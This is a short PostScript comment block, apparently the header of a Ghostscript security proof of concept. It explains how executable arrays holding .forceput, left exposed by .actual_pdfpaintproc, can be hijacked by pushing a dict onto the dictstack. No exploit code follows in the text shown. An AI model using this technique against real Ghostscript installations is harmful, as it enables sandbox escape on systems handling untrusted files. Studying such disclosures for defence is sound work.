% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some
% executable arrays onto the operand stack that contain .forceput, but are not
% marked as executeonly or pseudo-operators.
%
% The routine was attempting to pass them to ifelse, but we can cause that to
% fail because when the routine was declared, it used `bind` but many of the
% names it uses are not operators and so are just looked up in the dictstack.
%
% This means we can push a dict onto the dictstack and control how the routine
% works.
